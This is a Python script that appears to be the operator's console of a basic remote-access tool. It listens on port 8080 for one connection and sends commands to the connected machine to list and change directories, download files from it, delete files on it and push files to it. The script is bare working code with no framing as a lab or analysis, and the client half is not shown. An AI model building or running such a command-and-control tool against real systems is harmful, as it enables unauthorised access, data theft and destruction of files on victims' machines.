import os
import socket
s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host,port))
print("")
print("~ Server is Running at", host)
print("")
print("~ Waiting for Connections...")
s.listen(1)
conn, addr = s.accept()
print("")
print("~ ", addr, "Has Connected to the Server !")
while (1):
    command = input(str(" Command >> "))
    if (command == "dir"):
        conn.send(command.encode())
        print("")
        print("~ wait... ")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("output:", files)

    elif (command == "cd"):
        conn.send(command.encode())
        print("")
        user_input = input(str("Path >>  "))
        conn.send(user_input.encode())
        print("")
        print("~ wait...")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("~~~Output : ", files)


    elif (command == "dw"):
        conn.send(command.encode())
        filepath = input(str("File Path with name >> "))
        conn.send(filepath.encode())
        file = conn.recv(10000)
        filename = input("FileName including ext >> ")
        newfile = open(filename, "wb")
        newfile.write(file)
        newfile.close()
        print("")
        print("~ ", filename, "has been downloaded!")
        print("")


    elif command == "rm":
        conn.send(command.encode())
        fileanddir = input(str("Enter Filename and Dir >> "))
        print("~ wait..")
        conn.send(fileanddir.encode())
        print("")
        print("~ Removed!")


    elif command == "sendfile":
        file = input(str("Enter Filename and Dir >> "))
        filename = input(str("Enter Name For being sent >> "))
        data = open(file, "rb")
        file_data = data.read(7000)
        conn.send(file_data)
        print("~ ", file, "Has Been sent!")
        conn.send(filename.encode())





    else:
        print("~ failed Try again..")


